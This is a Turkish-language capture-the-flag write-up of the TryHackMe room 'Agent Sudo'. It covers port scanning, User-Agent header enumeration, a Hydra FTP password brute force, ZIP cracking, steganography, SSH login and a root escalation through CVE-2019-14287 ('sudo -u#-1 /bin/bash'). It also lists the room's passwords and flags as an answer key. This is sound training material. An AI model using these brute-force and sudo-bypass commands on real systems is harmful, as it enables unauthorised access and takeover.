# TryHackMe - Agent Sudo Write-Up

## Room Information

| Difficulty | Category |
|------------|----------|
| Easy | Linux, Web, Steganography, Privilege Escalation |

Bu write-up'ta TryHackMe platformunda bulunan **Agent Sudo** odasının çözüm sürecini adım adım inceleyeceğiz. Oda; web enumeration, User-Agent manipülasyonu, brute-force saldırıları, FTP erişimi, steganografi ve Linux privilege escalation gibi birçok temel pentest konusunu içerisinde barındırmaktadır.

---

# Enumeration

Her pentest sürecinde olduğu gibi ilk iş hedef sistemi enumerate etmektir.

Bunun için Nmap kullanıyoruz.

```bash
nmap -sC -sV -T5 10.112.156.127
```

Parametreler:

- **-sC** → Varsayılan NSE scriptlerini çalıştırır.
- **-sV** → Servis versiyonlarını tespit eder.
- **-T5** → Daha agresif tarama gerçekleştirir.

Sonuç:

```
PORT   STATE SERVICE VERSION

21/tcp open ftp vsftpd 3.0.3

22/tcp open ssh OpenSSH 7.6p1

80/tcp open http Apache 2.4.29
```

Makinede toplam **3 adet açık port** bulunmaktadır.

- FTP (21)
- SSH (22)
- HTTP (80)

İlk sorunun cevabı da buradan elde edilmektedir.

---

# Web Enumeration

HTTP servisini ziyaret ettiğimizde aşağıdaki sayfa bizi karşılıyor.

```
Dear agents,

Use your own codename as user-agent to access the site.

From,

Agent R
```

Sayfa bize doğrudan bir ipucu vermektedir.

> "Use your own codename as user-agent"

Yani standart HTTP isteği yeterli değildir.

Sunucu, gelen **User-Agent** başlığına göre farklı cevaplar üretmektedir.

---

# User-Agent Manipulation

Bu aşamada Burp Suite kullanılmaktadır.

İlk olarak hedefi yalnızca bu makine ile sınırlandırmak için Scope içerisine ekledim.

Ardından isteği **Repeater** sekmesine gönderdim.

İlk denemelerde farklı User-Agent değerleri kullandım.

Örneğin;

```
User-Agent: AgentR
```

ve

```
User-Agent: R
```

gibi denemeler yaptım.

Gönderilen istek:

```http
GET / HTTP/1.1
Host: 10.112.156.127
User-Agent: R
```

Sunucunun cevabı:

```
What are you doing!

Are you one of the 25 employees?

If not, I going to report this incident.
```

Bu cevap önemliydi.

Çünkü artık gerçekten User-Agent değerinin kontrol edildiğini doğrulamış olduk.

---

# Intruder ile Brute Force

Buradan sonra aklıma oldukça basit bir fikir geldi.

Mesaj içerisinde "25 employees" ifadesi geçiyordu.

Muhtemelen ajan isimleri tek harflerden oluşuyordu.

Bu nedenle User-Agent alanını Intruder içerisine gönderdim.

Payload olarak yalnızca alfabeyi kullandım.

```
A
B
C
D
E
...
Z
```

Bu teknik klasik anlamda parola brute-force'u olmasa da User-Agent header'ını enumerate etmek için oldukça işe yaradı.

İsteklerden biri diğerlerinden farklı cevap döndürdü.

```
HTTP/1.1 302 Found

Location:
agent_C_attention.php
```

Artık elimizde yeni bir endpoint vardı.

Redirect'i takip ettikten sonra yeni sayfaya ulaştık.

```
Attention chris,

Do you still remember our deal?

Please tell agent J about the stuff ASAP.

Also,

change your god damn password,

is weak.

From,

Agent R
```

Bu sayfa bize iki önemli bilgi vermektedir.

- Chris isimli kullanıcı bulunmaktadır.
- Şifresinin zayıf olduğu belirtilmektedir.

Bu nedenle sıradaki hedef FTP olacaktır.

---

# FTP Brute Force

Makinede FTP servisi açıktı.

Elimizde artık kullanıcı adı da vardı.

Hydra kullanarak parola saldırısı gerçekleştiriyorum.

```bash
hydra -l chris \
-P /usr/share/wordlists/rockyou.txt \
ftp://10.112.156.127 \
-t 16 -V
```

Kısa süre sonra parola bulundu.

```
login: chris

password: crystal
```

Böylece FTP erişimini elde etmiş olduk.

---

# FTP Enumeration

FTP bağlantısı kuruluyor.

```bash
ftp 10.112.156.127
```

Giriş:

```
Username:

chris

Password:

crystal
```

Dosyaları listeliyoruz.

```bash
ls -la
```

Sonuç:

```
To_agentJ.txt

cute-alien.jpg

cutie.png
```

İlk olarak metin dosyası indiriliyor.

```bash
get To_agentJ.txt
```

İçeriği:

```text
Dear agent J,

All these alien like photos are fake!

Agent R stored the real picture inside your directory.

Your login password is somehow stored in the fake picture.

It shouldn't be a problem for you.

From,

Agent C
```

Mesaj oldukça önemliydi.

Çünkü iki resim arasında bir ayrım yapıyordu.

- cute-alien.jpg → Fake (Decoy)
- cutie.png → Bir sonraki ipucunu içeriyor.

Bu nedenle ilk inceleme **cutie.png** üzerinde gerçekleştirildi.

---

# cutie.png Analizi

İlk olarak dosya tipi kontrol edildi.

```bash
file cutie.png
```

Ardından metadata incelendi.

```bash
exiftool cutie.png
```

Herhangi dikkat çekici bir bilgi bulunamadı.

Bu nedenle gömülü veri olup olmadığını görmek amacıyla Binwalk kullanıldı.

```bash
binwalk cutie.png
```

Sonuç:

```
ZIP archive

offset: 34562
```

PNG dosyasının sonuna gömülmüş bir ZIP arşivi bulundu.

Dosya dışarı çıkarılıyor.

```bash
binwalk -e --run-as=root cutie.png
```

Oluşan klasöre geçiyoruz.

```
_cutie.png.extracted
```

İçerisinde:

```
8702.zip
```

bulunmaktadır.

Normal unzip aracı uyumsuzluk hatası verdiği için 7-Zip tercih edildi.

```bash
7z x 8702.zip
```

Ancak ZIP dosyası parola korumalıydı.

Bu nedenle parola kırılması gerekmektedir.

---

# ZIP Password Cracking

Öncelikle hash oluşturuldu.

```bash
zip2john 8702.zip > zip_hash.txt
```

Ardından John The Ripper çalıştırıldı.

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
zip_hash.txt
```

Sonuç:

```
alien
```

ZIP parolası başarıyla elde edildi.

```
alien
```

Artık arşiv açılabilir.

```bash
7z x 8702.zip
```

Şifre olarak:

```
alien
```

girildi.

İçerisinden aşağıdaki dosya çıktı.

```
To_agentR.txt
```
# To_agentR.txt Analizi

Arşiv başarıyla açıldıktan sonra içerisinden **To_agentR.txt** isimli dosya elde edildi.

```bash
cat To_agentR.txt
```

İçerik:

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Mesaj içerisinde göze çarpan ilk ifade:

```
QXJlYTUx
```

Bu karakter dizisi Base64 formatına benzemektedir.

Decode işlemi gerçekleştirildi.

```bash
echo "QXJlYTUx" | base64 -d
```

Sonuç:

```
Area51
```

Artık elimizde yeni bir parola bulunmaktadır.

Bu aşamada ilk akla gelen yöntem steghide ile görüntü dosyası içerisine gizlenmiş veriyi çıkarmaktır.

---

# Steganography

Önce yanlış dosya üzerinde deneme yaptım.

```bash
steghide extract -sf cutie.png
```

Ancak steghide PNG formatını desteklemediği için herhangi bir veri çıkarılamadı.

To_agentJ.txt dosyasında daha önce belirtilen ipucuna tekrar baktığımızda;

> "All these alien like photos are fake."

Mesajda bahsedilen "fake picture" aslında **cute-alien.jpg** dosyasıydı.

Bu nedenle steghide bu kez JPEG dosyası üzerinde kullanıldı.

İlk denemelerde parola parametresi ile çalıştırdığım komut başarısız oldu.

```bash
steghide extract -sf cute-alien.jpg -p area51
```

Daha sonra etkileşimli olarak çalıştırdığımda parola kabul edildi.

```bash
steghide extract -sf cute-alien.jpg
```

Passphrase:

```
Area51
```

Çıktı:

```
wrote extracted data to "message.txt"
```

Yeni oluşan dosya okunuyor.

```bash
cat message.txt
```

İçeriği:

```text
Hi james,

Glad you find this message.

Your login password is hackerrules!

Don't ask me why the password look cheesy,
ask agent R who set this password.

Your buddy,

chris
```

Artık SSH kullanıcı adı ve parolasını elde etmiş olduk.

| Username | Password |
|----------|----------|
| james | hackerrules |

---

# SSH Access

SSH bağlantısı gerçekleştiriliyor.

```bash
ssh james@10.112.156.127
```

Parola:

```
hackerrules
```

Bağlantı kurulduktan sonra kullanıcı dizini inceleniyor.

```bash
ls
```

Sonuç:

```
Alien_autospy.jpg

user_flag.txt
```

User flag okunuyor.

```bash
cat user_flag.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

# Sudo Enumeration

Her privilege escalation sürecinde olduğu gibi ilk yapılması gereken işlem sudo yetkilerini kontrol etmektir.

```bash
sudo -l
```

Sonuç:

```text
User james may run the following commands on agent-sudo:

(ALL, !root) /bin/bash
```

İlk bakışta kullanıcı root dışında herkes olarak `/bin/bash` çalıştırabiliyor gibi görünmektedir.

Fakat bu yapılandırma geçmişte keşfedilmiş kritik bir sudo zafiyetinden etkilenmektedir.

---

# Privilege Escalation

Sistemde bulunan sudo sürümü **CVE-2019-14287** zafiyetinden etkilenmektedir.

Bu zafiyet sayesinde;

```
!root
```

kısıtlaması

```
-u#-1
```

tekniği kullanılarak bypass edilebilmektedir.

Root shell elde etmek için aşağıdaki komut çalıştırıldı.

```bash
sudo -u#-1 /bin/bash
```

Kontrol edildiğinde artık root yetkilerine sahibiz.

```bash
whoami
```

```
root
```

Böylece sistem üzerinde tam yetki elde edilmiş oldu.

---

# Root Flag

Root dizinine geçiyoruz.

```bash
cd /root
```

Dosyalar listeleniyor.

```bash
ls -la
```

Sonuç:

```
root.txt
```

Flag okunuyor.

```bash
cat root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box.

This box was designed for TryHackMe.

Tips, always update your machine.

Your flag is

b53a02f55b57d4439e3341834d70c062

By,

DesKel a.k.a Agent R
```

Makine başarıyla rootlanmış oldu.

---

# Questions & Answers

## How many open ports?

```
3
```

---

## How you redirect yourself to a secret page?

```
User-Agent Header
```

---

## What is the agent name?

```
Chris
```

---

## FTP password

```
crystal
```

---

## Zip file password

```
alien
```

---

## steg password

```
Area51
```

---

## Who is the other agent (in full name)?

```
James
```

---

## SSH password

```
hackerrules
```

---

## What is the user flag?

```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

## What is the incident of the photo called?

```
Roswell Alien Autopsy
```

---

## CVE number for the escalation

```
CVE-2019-14287
```

---

## What is the root flag?

```
b53a02f55b57d4439e3341834d70c062
```

---

## Bonus - Who is Agent R?

```
DesKel
```

---

# Attack Path

```
Nmap Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
User-Agent Manipulation
        │
        ▼
Burp Repeater
        │
        ▼
Burp Intruder (Alphabet Enumeration)
        │
        ▼
Agent C Endpoint
        │
        ▼
Username Discovery (Chris)
        │
        ▼
Hydra FTP Brute Force
        │
        ▼
FTP Login
        │
        ▼
Download Files
        │
        ▼
Binwalk
        │
        ▼
ZIP Extraction
        │
        ▼
John The Ripper
        │
        ▼
Base64 Decode
        │
        ▼
Steghide
        │
        ▼
SSH Access (James)
        │
        ▼
sudo -l
        │
        ▼
CVE-2019-14287
        │
        ▼
ROOT
```

---

# Tools Used

- Nmap
- Burp Suite
  - Repeater
  - Intruder
- Hydra
- FTP
- file
- exiftool
- binwalk
- zip2john
- John the Ripper
- 7-Zip
- base64
- steghide
- SSH
- sudo

---

# Lessons Learned

Bu oda sayesinde aşağıdaki konular üzerinde pratik yapılmıştır.

- Servis Enumeration
- HTTP Header Manipulation
- User-Agent tabanlı erişim kontrolleri
- Burp Suite Repeater kullanımı
- Burp Suite Intruder ile header enumeration
- Hydra ile FTP brute force
- FTP Enumeration
- Steganography
- Binwalk kullanımı
- John The Ripper ile ZIP parola kırma
- Base64 analizi
- Steghide ile gizli veri çıkarma
- SSH erişimi
- Linux Privilege Escalation
- Sudo misconfiguration analizi
- CVE-2019-14287 istismarı

---

